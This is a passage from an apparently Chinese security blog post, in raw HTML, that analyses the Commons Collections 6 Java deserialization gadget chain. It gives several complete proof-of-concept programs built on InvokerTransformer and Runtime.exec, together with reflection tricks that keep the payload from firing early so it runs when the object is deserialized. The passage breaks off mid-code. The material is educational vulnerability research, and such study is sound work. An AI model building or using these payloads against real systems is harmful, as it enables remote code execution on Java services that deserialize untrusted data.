class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在cc1中，我们有用到<code>AnnotationInvocationHandler</code>，但<code>AnnotationInvocationHandler</code>在JDK1.8做了限制，所以我们用到了<code>BadAttributeValueExpException</code></p>
<hr>
<p>写着一半发现不对劲，之前其实有写了cc5，写在cc1的地方重复了 LOL</p>
<p>剩下看<a href="#cc5">这里</a></p>
<hr>
<h2 id="Commons-Collections-6"><a href="#Commons-Collections-6" class="headerlink" title="Commons Collections 6"></a>Commons Collections 6</h2><h3 id="环境搭建-5"><a href="#环境搭建-5" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.7&amp;1.8</li>
</ul>
<h3 id="利用链构造-2"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>在cc5中，我们使用<code>TiedMapEntry.toString()</code>来执行<code>TiedMap.getValue()</code>，再由<code>BadAttributeInvocationHandler</code>来执行<code>TiedMapEntry.toString()</code>，从而完成利用链的衔接。我们在cc6中，将另外寻找一条链，能够连接<code>TiedMapEntry.getValue()-&gt;Lazymap.get() -&gt; ChainedTransformer.transform()</code></p>
<h4 id="TiedMapEntry-hashCode"><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry.hashCode()"></a>TiedMapEntry.hashCode()</h4><p>我们发现，在<strong>hashCode()<strong>方法中也call到了</strong>getValue()</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();<span class="comment">//这里也call到了同类下的getValue()</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么什么能够执行<code>hashCode()</code>呢</p>
<h4 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap.hash()"></a>HashMap.hash()</h4><p>我们在<code>HashMap</code>下找到了<code>hash()</code>方法，其中call到了<code>hashCode()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();<span class="comment">//这里我们如果给k赋值为TiedMapEntry的instance就可以执行命令</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续找可以连接<code>hash()</code>的方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145232237.png" alt="image-20211204145232237"></p>
<p>我们发现这里有很多地方都用到了<code>hash()</code>，我们一个一个分析</p>
<h4 id="调用hash-处一（方法一）："><a href="#调用hash-处一（方法一）：" class="headerlink" title="调用hash()处一（方法一）："></a>调用hash()处一（方法一）：</h4><h5 id="HashMap-putForCreate-amp-HashMap-readObject"><a href="#HashMap-putForCreate-amp-HashMap-readObject" class="headerlink" title="HashMap.putForCreate() &amp; HashMap.readObject()"></a>HashMap.putForCreate() &amp; HashMap.readObject()</h5><p>最后我们找到putForCreate()，发现它调用了<code>hash()</code>且它<strong>会被readObject()调用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">putForCreate</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="literal">null</span> == key ? <span class="number">0</span> : hash(key);<span class="comment">//如果key不为null,这里会调用hash(key)</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Look for preexisting entry for key.  This will never happen for</span></span><br><span class="line"><span class="comment">     * clone or deserialize.  It will only happen for construction if the</span></span><br><span class="line"><span class="comment">     * input Map is a sorted map whose ordering is inconsistent w/ equals.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">            e.value = value;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    createEntry(hash, key, value, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145642205.png" alt="image-20211204145642205"></p>
<p>那么我们就可以确定使用这个链了</p>
<blockquote>
<p>HashMap.readObject([key,value])-&gt;HashMap.putForCreate(key,value)-&gt;HashMap.hash(key)-&gt;key.hashcode()-&gt;TiedMapEntrykey.hashCode()-&gt;TiedMapEntry.getValue(this.key=chainedTransformer)-&gt;Lazymap.get(chainedTransformer) -&gt; ChainedTransformer.transform() -&gt; …..</p>
</blockquote>
<p>我们尝试来构造一下<strong>POC</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//让TiedMapEntry里的map为lazyMap,key随意</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">serMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        serMap.put(tiedMapEntry,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(serMap);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line"><span class="comment">//        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);</span></span><br><span class="line"><span class="comment">//        objectInputStream.readObject();//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>奇怪的是，我们并没有反序列化，但计算器依然弹出来了，说明这里某处又触发了一次命令执行。</p>
<h5 id="HashMap-put-的问题"><a href="#HashMap-put-的问题" class="headerlink" title="HashMap.put()的问题"></a>HashMap.put()的问题</h5><p>还记得我们之前查找哪些地方调用了HashMap.hash()吗，那里貌似出现了很多地方调用。其中一个地方 <code>put()</code>方法里，也对<code>hash()</code>进行了调用，<strong>正好我们要在生成payload的时候put进key-value对</strong>，那该怎样才能让他在生成payload的时候不触发？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (table == EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);<span class="comment">//这里也调用了hash，导致后面漏洞触发了。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;<span class="comment">//把key-value放入Entry&lt;K,V&gt;</span></span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>其实刚开始分析的时候总觉得这一幕似曾相识，感觉好像自己之前分析过<code>put</code>重复执行命令的这种类似的情况。后来去网上查了下，发现这不是<strong>URLDNS</strong>的内容吗？</p>
<p>因为触发的地方在<code>LazyMap.get() -&gt; ChainedTransformer.transform()</code></p>
<p>所以我们可以在构造LazyMap的时候让他执行一个无效的ChainedTransformer,然后最后再传入真正有用的<code>transformer</code></p>
<p><strong>POC如下：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//写一个fake的trasnformers</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//这是真的transformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//让TiedMapEntry里的map为lazyMap,key随意</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">serMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        serMap.put(tiedMapEntry,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 把有用的transformer换回来 */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">myTransformers</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        myTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        myTransformers.set(chainedTransformer,transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(serMap);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>奇怪的是，序列化时不弹计算器了，可是反序列化的时候也没有弹计算器 -》 我们没有成功触发漏洞。</p>
<p>问题出在哪里呢？</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204162857604.png" alt="image-20211204162857604"></p>
<p>我们发现执行到<code>putForCreate</code>的时候，被传过去的key值是<code>TiedMapEntry</code>中的key值，而并非我们想要的<code>tiedMapEntry</code>，所以我们猜测某个地方将<code>TiedMapEntry</code>中的key值给加到map里去了。</p>
<p>跟踪后发现问题出在<strong>LazyMap.get():</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里我们的factory是<code>fakeTransform</code>,key是<code>leihehe</code>，在<code>super.map.put(key, value);</code>处，TiedMapEntry被添加了一个key值</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183033871.png" alt="image-20211204183033871"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183536474.png" alt="image-20211204183536474"></p>
<p>导致反序列化漏洞触发失败。</p>
<p>所以我们的<strong>解决方法</strong>如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.remove(<span class="string">&quot;leihehe&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//写一个fake的trasnformers</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//这是真的transformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//让TiedMapEntry里的map为lazyMap,key随意</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">serMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        serMap.put(tiedMapEntry,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        <span class="comment">/* 把有用的transformer换回来 */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">myTransformers</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        myTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        myTransformers.set(chainedTransformer,transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(serMap);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span 